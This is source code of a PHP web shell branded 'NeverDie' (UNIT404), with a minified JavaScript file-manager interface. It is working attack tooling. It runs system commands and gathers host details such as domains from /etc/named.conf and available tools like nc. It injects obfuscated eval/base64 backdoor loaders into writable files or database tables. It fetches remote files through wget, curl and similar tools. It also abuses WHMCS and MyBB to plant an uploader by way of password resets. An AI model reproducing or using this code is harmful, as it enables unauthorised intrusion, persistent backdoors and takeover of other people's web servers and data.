e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("UNIT404_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return UNIT404SyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=UNIT404b64(t)),void 0!==l&&null!=l&&0!=l.length)n=UNIT404b64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=UNIT404b64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <span opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' style='cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;'>X</span></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),UNIT404loader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?UNIT404loader(b,"block"):(UNIT404loader("editor","block"),b="editor")),_Ajax(d.URL,"a="+UNIT404b64("FilesTools")+"&c="+UNIT404b64(f)+"&UNIT4041="+UNIT404b64(e)+"&UNIT4042="+UNIT404b64(a)+"&UNIT4043="+r+"&UNIT4044="+n+"&UNIT4045=&UNIT4046=&UNIT4047=&UNIT4048=&UNIT4049=&UNIT40410=&&ajax="+UNIT404b64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),UNIT404ShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&UNIT404UpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?UNIT404LoaderOnTop("none"):UNIT404loader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&UNIT404ShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&UNIT404ShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),UNIT404LoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function UNIT404LoadAceEditor(e,a){return!1;if(void 0===a&&(a=!1),null==$("UNIT404-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="UNIT404-ace-plugin",t.onload=function(){UNIT404LoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==UNIT404_ace_editors.editor&&(UNIT404_ace_editors.editor={});var i=getCookie("UNIT404_ace_theme_editor"),l=getCookie("UNIT404_ace_fontsize_editor");void 0===i&&(i="gruvbox"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),UNIT404_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),UNIT404_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),UNIT404_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),UNIT404_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),UNIT404_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),UNIT404_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),UNIT404_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){UNIT404_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==UNIT404_ace_editors.eval&&(UNIT404_ace_editors.eval={});i=getCookie("UNIT404_ace_theme_eval"),l=getCookie("UNIT404_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),UNIT404_ace_editors.eval["phpeval-"+o]=ace.edit(t),UNIT404_ace_editors.eval["phpeval-"+o].setReadOnly(a),UNIT404_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),UNIT404_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),UNIT404_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),UNIT404_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){UNIT404_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+UNIT404b64("checkfiletype")+"&path="+UNIT404b64(editor_files[t].pwd)+"&arg="+UNIT404b64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","UNIT404","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("UNIT404_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=UNIT404_ace_editors.editor[e].selection.toJSON();UNIT404_ace_editors.editor[e].selectAll(),UNIT404_ace_editors.editor[e].focus(),document.execCommand("copy"),UNIT404_ace_editors.editor[e].selection.fromJSON(a),UNIT404ShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=UNIT404b64(e,!0),a=UNIT404b64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return UNIT404b64(i,!0)}function reloadSetting(e){return UNIT404loader(UNIT404_before_do_action_id,"block"),_Ajax(d.URL,"a="+UNIT404b64("settings")+"&UNIT4041="+UNIT404b64(e.protect.value)+"&UNIT4042="+UNIT404b64(e.lgpage.value)+"&UNIT4043="+UNIT404b64(e.username.value)+"&UNIT4044="+UNIT404b64(e.password.value)+"&UNIT4045="+UNIT404b64(">>")+"&UNIT4046="+UNIT404b64(e.icon.value)+"&UNIT4047="+UNIT404b64(e.post_encrypt.value)+"&UNIT4048="+UNIT404b64("main")+"&UNIT4049="+UNIT404b64(e.cgi_api.value)+"&c="+UNIT404b64(c_)+"&ajax="+UNIT404b64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),UNIT404loader(a,"none")},!1,UNIT404_before_do_action_id),UNIT404_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+UNIT404b64("settings")+"&UNIT4041="+UNIT404b64(JSON.stringify(a))+"&UNIT4042="+UNIT404b64(">>")+"&UNIT4043="+UNIT404b64(t)+"&UNIT4048="+UNIT404b64("color")+"&c="+UNIT404b64(c_)+"&ajax="+UNIT404b64("true"),function(e){evalJS(e)},!0)}function UNIT404b64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __UNIT404_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=UNIT404_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+UNIT404b64("cgishell")+"&UNIT4041="+UNIT404b64(e)+"&ajax="+UNIT404b64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
</script>
...
$cmd_uname = UNIT404Ex("uname -a",false,false);
...
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="background:url(https://i.gyazo.com/c8ca0775e4e51f7e0db826b72a023b11.gif) center/cover no-repeat fixed #000;">
...
for($s=1;$s<=10;$s++){
echo '<input type="hidden" name="UNIT404'.$s.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?UNIT404"><span style="color:#FF0000;font-weight:bold;">'.__UNIT404_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__UNIT404_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8" style="text-align:center;vertical-align:middle;"><img style="border-radius:50%;" width="200" height="200" alt="NeverDie SheLL" draggable="false" src="https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png" /><br><a href="https://t.me/BotFather" target="_blank" style="text-decoration:none;"><font style="font-size:10.5px;font-weight:bold;letter-spacing:5px;color:#FFFFFF;text-shadow:0 0 5.5px #FFFFFF, 0 0 10.5px #FFFFFFff;">VENI VIDI VICI</font></a></td>
</tr>
<tr>
...
if($GLOBALS['sys']=='unix'){
$d0mains = _UNIT404_file("/etc/named.conf",false);
...
<td><span class="header_vars">Total:</span><b>'.UNIT404Size($totalSpace).' </b><span class="header_vars">Free:</span><b>' . UNIT404Size($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
...
if(!@ini_get('safe_mode')){
if(strlen(UNIT404Ex("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bziUNIT4042','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(UNIT404Which($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
if($x==0){echo "<span class='header_values' id='header_useful'>NeverDie</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>
<tr>
...
$x=0;
foreach($downloaders as $item2)if(UNIT404Which($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
...
echo UNIT404Ex('ver',false,false);
echo '</td>
</tr> <tr>
...
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.UNIT404_GetDisable_Function().'</b></td>
</tr>
<tr>
...
<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ HOME ]</span> </a></td>
</tr>
</table>
</div>
<div id="meunlist">
...
function __showicon($r){
	...
	$s['UNIT404mini']='https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png';
	$s['loader']='https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png';
	//return 'data:image/png;base64,'.__get_resource($s[$r]);
	return $s[$r];
}
function UNIT404inbackdoor(){
UNIT404head();
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('NeverDie is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='UNIT404'>NeverDie Uploader</option><option value='my'>My Private Shell</option></select>";
$cwd = 'Example: /home/NeverDie/public_html/index.php';
if($_POST['UNIT4041']=='file'){
echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='NeverDie'> <input type='submit' value=' '>{$textarea}</form></p></center>");
if($_POST['UNIT4042']!=''&&$_POST['UNIT4043']!=''&&$_POST['UNIT4044']!=''){
$method = $_POST['UNIT4042'];
$file = $_POST['UNIT4043'];
$shell = $_POST['UNIT4044'];
$key = str_replace(array('"','\''),'',trim($_POST['UNIT4045']));
if($key=='')$key='UNIT404';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__UNIT404_SHELL_CODE'];}
$code = '<?php if(isset($_GET["UNIT404"])&&$_GET["UNIT404"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?UNIT404=".$key.'</font>');}else{__alert($error);}}}
if($_POST['UNIT4041']=='db'){
...
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'NeverDie', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['UNIT4042']!=''&&$_POST['UNIT4043']!=''&&$_POST['UNIT4045']!=''&&$_POST['UNIT4046']!=''){
$dbhost = $_POST['UNIT4042'];
$dbuser = $_POST['UNIT4043'];
$dbpw = $_POST['UNIT4044'];
$dbname = $_POST['UNIT4045'];
$file = $_POST['UNIT4046'];
$method = $_POST['UNIT4047'];
$shell = $_POST['UNIT4048'];
$key = str_replace(array('"','\''),'',trim($_POST['UNIT4049']));
if($key=='')$key='UNIT404';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__UNIT404_SHELL_CODE'];}
if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
$code = '<?php if(isset($_GET["UNIT404"])&&$_GET["UNIT404"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM UNIT404_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `UNIT404_bc`');
@mysqli_query($conn,'CREATE TABLE `UNIT404_bc` (code LONGTEXT)');
@mysqli_query($conn,'INSERT INTO `UNIT404_bc` VALUES("'.$shell.'")');
@file_put_contents($file,$code."\n".@file_get_contents($file));
__alert($success."<br>Run With: ".basename($file)."?UNIT404=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
UNIT404footer();
}
function UNIT404findmtime(){
$currentDir = getcwd();
...
<div style='background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;border:1px solid #3498db;'>
...
if($_POST['UNIT4043']=='>>' && !empty($_POST['UNIT4041'])){
$directory = $_POST['UNIT4041']; 
$timeRange = $_POST['UNIT4042']; 
...
if(isset($_POST['UNIT4041'],$_POST['UNIT4042'],$_POST['UNIT4043'])&&!empty($_POST['UNIT4041'])&&$_POST['UNIT4043']=='>>'){
echo __pre();
$url = $_POST['UNIT4041'];
$path = $_POST['UNIT4042'];
echo('<center>');
...
$buff = UNIT404Ex("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = UNIT404Ex("curl ".$url." -o ".$saveas);
if(@is_file($saveas)) return true;
$buff = UNIT404Ex("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = UNIT404Ex("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = UNIT404Ex("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = UNIT404Ex("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = UNIT404Ex("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
...
if(empty($content)||!$content){
	$content = UNIT404Ex("cat '".addslashes($file)."'");
}
return $content;
}
function UNIT404Settings(){
UNIT404head();
UNIT404Num(6,7,8,9,10);
...
foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['UNIT4049'])&&$_POST['UNIT4049']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['UNIT4049'])?'selected':'')).'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['UNIT4047'])&&$_POST['UNIT4047']==$key?"selected":(__UNIT404_POST_ENCRYPTION__&&empty($_POST['UNIT4047'])?'selected':'')).'>'.$val.'</option>';
...
if($_POST['UNIT4045']=='>>'){
echo __pre();
if(!empty($_POST['UNIT4043'])){
$protect = $_POST['UNIT4041'];
$lgpage = $_POST['UNIT4042'];
$username = $_POST['UNIT4043'];
$password = md5($_POST['UNIT4044']);
$icon = $_POST['UNIT4046'];
$post_encrypt = $_POST['UNIT4047'];
$cgi_api_val = $_POST['UNIT4049'];
...
echo '<b>UserName: </b><font color="red"><b>'.$username.'</b></font><br /><b>Password: </b><font color="red"><b>'.$_POST['UNIT4044'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
}else{
...
if($_POST['UNIT4047']=='export'){
	...
	$file = "UNIT404_color_config_".date('Y-m-d-h_i_s').".conf";
...
if($_POST['UNIT4042']=='>>'){
	echo __pre();
	$colors = json_decode($_POST["UNIT4041"],true);
	$array = "";
	$is_default = isset($_POST["UNIT4043"])&&$_POST["UNIT4043"]=="1"?true:false;
	$glob_colors = $GLOBALS["__UNIT404_COLOR__"];
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
...
$delimiter = (!empty($_POST['UNIT4041']) ? $_POST['UNIT4041'] : '::');
$selected_data = json_decode($_POST['UNIT4042'], true);
$username = ($_POST['UNIT4043']);
$password = ($_POST['UNIT4044']);
$dbname = ($_POST['UNIT4045']);
$dfile = ($_POST['UNIT4046']);
$host = ($_POST['UNIT4047']);
$table = array('td1' =>
...
function UNIT404ShellInjectors(){
UNIT404head();
echo '<div class=header>';
UNIT404Num(11);
...
if(isset($_POST['UNIT4041']) && $_POST['UNIT4041']== 'whmcs'){
UNIT404Num();
...
if(isset($_POST['UNIT4046'])) {
$dbu = $_POST['UNIT4046'];
$dbn = $_POST['UNIT4047'];
$dbp = $_POST['UNIT4048'];
$dbh = $_POST['UNIT4049'];
$path = $_POST['UNIT40410'];
$method = $_POST['UNIT4044'];
$index = "{php}".UNIT404_UPLOADER.";{/php}";
...
$create = "insert into tblclients (email) values('NeverDie@fbi.gov')";
$result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version') && $method == 'auto'){
$UNIT404Sole = new UNIT404CURL(true);
$saveurl = $UNIT404Sole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$UNIT404Sole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=NeverDie@fbi.gov");
...
$ff= 'http://'.$path."/UNIT40409.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>NeverDie@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/UNIT40409.php' target='_blank'>".$path."/UNIT40409.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
}if(isset($_POST['UNIT4042']) && $_POST['UNIT4042']== 'mybb'){
UNIT404Num(1,2,3,5);
...
$dbp = $_POST['UNIT4048'];
$dbh = $_POST['UNIT4049'];
$prefix = $_POST['UNIT40410'];
$method = $_POST['UNIT4044'];
$shellCode = "{\${".UNIT404_UPLOADER."}}";
...
$UNIT404Curl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
$ff = 'http://'.$realurl.$realpath."/UNIT40409.php";
output($ff);
